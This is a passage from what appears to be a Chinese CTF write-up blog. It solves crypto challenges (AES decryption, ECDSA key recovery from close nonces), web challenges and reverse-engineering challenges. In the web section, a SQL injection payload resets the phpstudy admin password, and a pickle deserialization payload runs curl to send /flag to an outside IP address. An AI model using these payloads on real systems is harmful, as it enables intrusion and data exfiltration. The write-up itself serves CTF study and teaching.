class="string">&#x27;e086deeb9f060c014867c5adbd1ee1b449193b6e6177f58a36948282e1728f3b529b2def3c39f69c7a9001b4cac4d1d5&#x27;</span></span><br><span class="line">key = long_to_bytes(<span class="number">275609957223526193497841020687316070508</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">m = cipher.decrypt(<span class="built_in">bytes</span>.fromhex(enc))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;182273bd-61f2-7147-acd8-d571de11bb40&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ecdsa"><a href="#ecdsa" class="headerlink" title="ecdsa"></a>ecdsa</h3><blockquote><p>Let me tell you a story about ecdsa.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">gen = <span class="keyword">lambda</span>: p + getPrime(<span class="number">16</span>)</span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + os.urandom(<span class="number">32</span> - <span class="built_in">len</span>(m) % <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">30</span>)</span><br><span class="line">sk = ecdsa.SigningKey.from_secret_exponent(</span><br><span class="line">    secexp=bytes_to_long(key),</span><br><span class="line">    curve=ecdsa.SECP256k1</span><br><span class="line">)</span><br><span class="line">sig1 = sk.sign(data=<span class="string">b&#x27;This is the first message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">sig2 = sk.sign(data=<span class="string">b&#x27;Here is another message.&#x27;</span>, k=gen()).<span class="built_in">hex</span>()</span><br><span class="line">enc = xor(hashlib.sha512(key).digest(), pad(secret.flag)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sig1 = &#125;</span>\n<span class="subst">&#123;sig2 = &#125;</span>\n<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sig1 = &#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line"><span class="string">sig2 = &#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line"><span class="string">enc = &#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>选取标准曲线SECP256k1，且查看ecdsa包源码，<code>sig=r_str+s_str</code>。</p><p>根据式子：</p><p>$s_1 \equiv k_1^{-1}(z_1+r_1d) \pmod n,s_2 \equiv k_2^{-1}(z_2+r_2d) \pmod n$</p><p>已知 $r_1,s_1,r_2,s_2,z_1,z_2$，且 $k_1-k_2=\Delta k$ 很小，联立用 $\Delta k$ 表示 $d$，再分别爆破 $\Delta k$ 值即可得到正确的 $d$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1,sha512</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</span></span><br><span class="line">n = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"></span><br><span class="line">h1 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;This is the first message.&#x27;</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">h2 = <span class="built_in">int</span>(sha1(<span class="string">b&#x27;Here is another message.&#x27;</span>).hexdigest(), <span class="number">16</span>)</span><br><span class="line">sig1 = <span class="string">&#x27;3f4a6f288e35a4397201d246a98c1f9cfa463e67717fbbdcbd26d7fac75f875855455c2bfb355f7f593ffbe4c4bd1fc729cc129976b56905639100c8ac716b37&#x27;</span></span><br><span class="line">sig2 = <span class="string">&#x27;9f563b21f0ee31b2f7a1a8c6edc8ff23b63e0a9d5dd4a699ecc3164871b4982df51bb2feb4bc06c578afd21d3e6227231dd5fe1d8440f3dcd025fd3ea68f5516&#x27;</span></span><br><span class="line">enc = <span class="string">&#x27;cc66d251bfa54954890c81dc1c607bae716573949f327db18aa1f4c0f420b8d29dc7e7ff9edb17b90306bd2aa753fc3fd4dafb9cc4b771cbdd79000ef05a40c0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> inverse_mod(x,n)</span><br><span class="line"></span><br><span class="line">r1 = <span class="built_in">int</span>(sig1[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">s1 = <span class="built_in">int</span>(sig1[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line">r2 = <span class="built_in">int</span>(sig2[:<span class="number">64</span>], <span class="number">16</span>)</span><br><span class="line">s2 = <span class="built_in">int</span>(sig2[<span class="number">64</span>:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> dk <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">2</span>^<span class="number">16</span>, <span class="number">2</span>^<span class="number">16</span>):</span><br><span class="line">    x = (dk-(inv(s2)*h2-inv(s1)*h1))*inv(inv(s2)*r2-inv(s1)*r1)%n</span><br><span class="line">    <span class="keyword">if</span> x.nbits()&lt;=<span class="number">30</span>*<span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(dk,x)</span><br><span class="line">        flag = <span class="built_in">int</span>(sha512(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:])).hexdigest(), <span class="number">16</span>) ^^ <span class="built_in">int</span>(enc,<span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># -12538 529916052714421365211802626556164022962456609322782019794355446252399179</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;2f64731e-785b-4259-4566-3d17554bfb7b&#125;\xed\x98\x98\xbc\x92+\xc7\x7f\xe2_\xfd\x17\x1e\x9c\xf7\x17Rq\xfa3\xa2&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>NKCTF 2023 - xiaopi 原题，参考 <a href="https://blog.csdn.net/weixin_52365980/article/details/129803385。">https://blog.csdn.net/weixin_52365980/article/details/129803385。</a></p><p>在请求头加 <code>X-Requested-With: XMLHttpRequest</code> 可以进入后台登录界面，</p><p>再参考小皮面板前台sql注入更改管理员密码，构造payload：</p><p><code>admin&#39;;UPDATE ADMINS set PASSWORD = &#39;202cb962ac59075b964b07152d234b70&#39;;--</code></p><p>接着用 <code>admin/123</code> 可进入后台，在计划任务界面直接RCE即可获取flag。</p><p>​    </p><h3 id="easypy"><a href="#easypy" class="headerlink" title="easypy"></a>easypy</h3><p>扫描得到目录 <code>/download</code>，访问下载 <code>www.zip</code>，里面真正的代码在 <code>app.cpython-38.pyc</code>，反编译：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: app.cpython-38.pyc (Python 3.8)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;小p想要找一个女朋友，你能帮他找找看么？&#x27;</span></span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">girlfriends</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;data&#x27;</span>):</span><br><span class="line">        data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">        numpydata = base64.b64decode(data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">and</span> <span class="string">b&#x27;bash&#x27;</span> <span class="keyword">in</span> numpydata <span class="keyword">or</span> <span class="string">b&#x27;sh&#x27;</span> <span class="keyword">in</span> numpydata:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;不能走捷径啊&#x27;</span></span><br><span class="line">        resp = <span class="literal">None</span>.loads(numpydata)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;可以的，要的就是一种感觉&#x27;</span></span><br><span class="line"></span><br><span class="line">girlfriends = app.route(<span class="string">&#x27;/girlfriends&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(girlfriends)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line">download = app.route(<span class="string">&#x27;/download&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(download)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察到路由 <code>/girlfriends?data=</code>，需提供opcode来RCE，但不能包含 <code>R</code> 字符，参考文章，还可以使用 <code>i</code> 或 <code>o</code> 字符实现RCE，而禁用了 <code>sh</code>，不好实现反弹shell，用curl命令外带flag值到vps即可：</p><p>vps：<code>python3 -m http.server 10010</code></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;&#x27;&#x27;(S&#x27;curl http://120.25.104.209:10010?`base64 /flag`&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>对应base64：<code>KFMnY3VybCBodHRwOi8vMTIwLjI1LjEwNC4yMDk6MTAwMTA/YGJhc2U2NCAvZmxhZ2AnCmlvcwpzeXN0ZW0KLg==</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h3><blockquote><p>数字游戏！</p></blockquote><p>看反编译代码盲猜为数独游戏，对用户输入的数独矩阵进行求解，并输出解密后的flag在每一次循环中，读取玩家输入的数独矩阵并寻找空着的位置，接收到一个输入数字后，判断其是否合法，如果合法则填充进矩阵中，并对其求和。如果求解成功，则输出flag。</p><p>使用在线数独求解器，将填入数字连成字符串 <code>468912723481342575971422657913948591537428763345261</code>输入得到flag：<code>flag&#123;bbcbff5c1f1ded46c25d28119a85c6c2&#125;</code>。</p><p>​    </p><h3 id="BWBA"><a href="#BWBA" class="headerlink" title="BWBA"></a>BWBA</h3><blockquote><p>一位85岁老大爷于今年考入大学的计算机科学与技术专业，在第一年的学习中学到了高等数学、离散数学、C++等，下面是大爷编写的一道程序，请破解大爷写的程序</p></blockquote><p> <code>encrypt()</code> 加密函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">double</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">double</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">double</span> v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">double</span> v6; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">double</span> v7; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+23h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::size(a2);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">double</span>&gt;::allocator(&amp;v8);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(a1, v9, <span class="number">0LL</span>, &amp;v8);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">double</span>&gt;::~allocator(&amp;v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v9; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::operator[](a2, j);</span><br><span class="line">      v6 = <span class="built_in">cos</span>((j + <span class="number">0.5</span>) * (<span class="number">3.141592653589793</span> * i) / v9) * v5;</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::operator[](a1, i);</span><br><span class="line">      *v2 = *v2 + v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      v7 = <span class="built_in">sqrt</span>(<span class="number">2.0</span> / v9);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v7 = <span class="built_in">sqrt</span>(<span class="number">1.0</span> / v9);</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">double</span>&gt;::operator[](a1, i);</span><br><span class="line">    *v3 = *v3 * v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>识别代码逻辑为离散余弦变换(DCT)算法，写一个逆算法解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;370.75 234.362 -58.0834 59.8212 88.8221 -30.2406 21.8316 49.9781 -33.5259 2.69675 43.5386 -30.2925 -28.0754 27.593 -2.53962 -27.1883 -5.60777 -0.263937 6.80326 8.03022 -6.34681 -0.89506 -6.80685 -13.6088 27.0958 29.8439 -21.7688 -20.6925 -13.2155 -37.0994 2.23679 37.6699 -3.5 9.85188 57.2806 13.5715 -20.7184 8.6816 3.59369 -4.5302 4.22203 -28.8166 -23.695 31.2268 6.58823 -39.9966 -20.7877 -19.7624 -22.031 16.3285 2.07557 -26.2521 16.1914 18.3976 -26.9295 3.03769 41.0412 20.2598 14.991 6.99392 -22.3752 -7.24466 8.96299 -10.4874&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">c = [<span class="built_in">float</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">idct</span>(<span class="params">signal</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Perform Inverse Discrete Cosine Transform (IDCT) on signal&quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(signal)</span><br><span class="line">    x = np.zeros(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">0</span>:</span><br><span class="line">                y += signal[j] / np.sqrt(n)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y += signal[j] * np.sqrt(<span class="number">2</span>/n) * np.cos((np.pi*(<span class="number">2</span>*i+<span class="number">1</span>)*j)/(<span class="number">2</span>*n))</span><br><span class="line">        x[i] = y</span><br><span class="line">    <span class="keyword">return</span> np.<span class="built_in">round</span>(x).tolist()</span><br><span class="line"></span><br><span class="line">out = idct(c)</span><br><span class="line">out = [<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> out]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;9ab488a7-5b11-1b15-04f2-c230704ecf72&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Emoji-Connect"><a href="#Emoji-Connect" class="headerlink" title="Emoji Connect"></a>Emoji Connect</h3><blockquote><p>连连看</p></blockquote><p>使用ILSpy分析Game模块，内含48*48 emoji表情矩阵，关键逻辑：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[] number = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">48</span>]</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">25588</span>, <span class="number">31114</span>, <span class="number">28727</span>, <span class="number">26722</span>, <span class="number">24948</span>, <span class="number">25135</span>, <span class="number">25480</span>, <span class="number">29029</span>, <span class="number">23025</span>, <span class="number">25775</span>,</span><br><span class="line">    <span class="number">15411</span>, <span class="number">25423</span>, <span class="number">25202</span>, <span class="number">30031</span>, <span class="number">27380</span>, <span class="number">30734</span>, <span class="number">25054</span>, <span class="number">25109</span>, <span class="number">20741</span>, <span class="number">28568</span>,</span><br><span class="line">    <span class="number">28802</span>, <span class="number">24591</span>, <span class="number">26063</span>, <span class="number">30940</span>, <span class="number">30375</span>, <span class="number">19411</span>, <span class="number">29573</span>, <span class="number">20845</span>, <span class="number">27232</span>, <span class="number">26743</span>,</span><br><span class="line">    <span class="number">25779</span>, <span class="number">24986</span>, <span class="number">31498</span>, <span class="number">30978</span>, <span class="number">22945</span>, <span class="number">26563</span>, <span class="number">35012</span>, <span class="number">29994</span>, <span class="number">27016</span>, <span class="number">29535</span>,</span><br><span class="line">    <span class="number">21342</span>, <span class="number">26573</span>, <span class="number">27569</span>, <span class="number">25408</span>, <span class="number">31567</span>, <span class="number">25503</span>, <span class="number">21385</span>, <span class="number">27207</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Select_Unit</span>(<span class="params">Range Target</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;Range&gt; list = <span class="keyword">new</span> List&lt;Range&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (Range cell <span class="keyword">in</span> Target.Cells)</span><br><span class="line">    &#123;</span><br><span class="line">        list.Add(cell);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((Target.Cells.Count == <span class="number">2</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) != <span class="literal">null</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing) != <span class="literal">null</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing) != <span class="string">&quot;\ud83d\udca5&quot;</span> &amp;&amp; (<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) != <span class="string">&quot;\ud83d\udca5&quot;</span>) &amp;&amp; (((<span class="built_in">dynamic</span>)list[<span class="number">0</span>].get_Value(Type.Missing) == (<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing)) ? <span class="literal">true</span> : <span class="literal">false</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span>[] array = ((IEnumerable&lt;<span class="built_in">char</span>&gt;)(<span class="built_in">string</span>)(<span class="built_in">dynamic</span>)list[<span class="number">1</span>].get_Value(Type.Missing)).Select((Func&lt;<span class="built_in">char</span>, <span class="built_in">int</span>&gt;)((<span class="built_in">char</span> c) =&gt; c)).ToArray();</span><br><span class="line">        <span class="built_in">int</span> num = (array[<span class="number">0</span>] - <span class="number">55296</span>) * <span class="number">1024</span> + array[<span class="number">1</span>] - <span class="number">56320</span> + <span class="number">65536</span> - <span class="number">128512</span>;</span><br><span class="line">        number[num] -= (list[<span class="number">1</span>].Row - <span class="number">1</span>) * (list[<span class="number">1</span>].Column - <span class="number">1</span>);</span><br><span class="line">        number[num] -= (list[<span class="number">0</span>].Row - <span class="number">1</span>) * (list[<span class="number">0</span>].Column - <span class="number">1</span>);</span><br><span class="line">        Range range = list[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">object</span> missing = Type.Missing;</span><br><span class="line">        <span class="built_in">object</span> obj;</span><br><span class="line">        list[<span class="number">1</span>].set_Value(Type.Missing, obj = <span class="string">&quot;\ud83d\udca5&quot;</span>);</span><br><span class="line">        range.set_Value(missing, obj);</span><br><span class="line">    &#125;</span><br><span class="line">    check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">48</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="built_in">dynamic</span>)sheet1.Cells[i + <span class="number">1</span>, j + <span class="number">1</span>]).Value != <span class="string">&quot;\ud83d\udca5&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MessageBox.Show(Encoding.ASCII.GetString(number.Select((<span class="built_in">int</span> n) =&gt; (<span class="built_in">byte</span>)n).ToArray()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每选中相同的两个emoji，按照emoji对应的array值，将number数组里对应下标的值，减去选中的两个emoji所在的行列号之积。</p><p>上脚本模拟：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 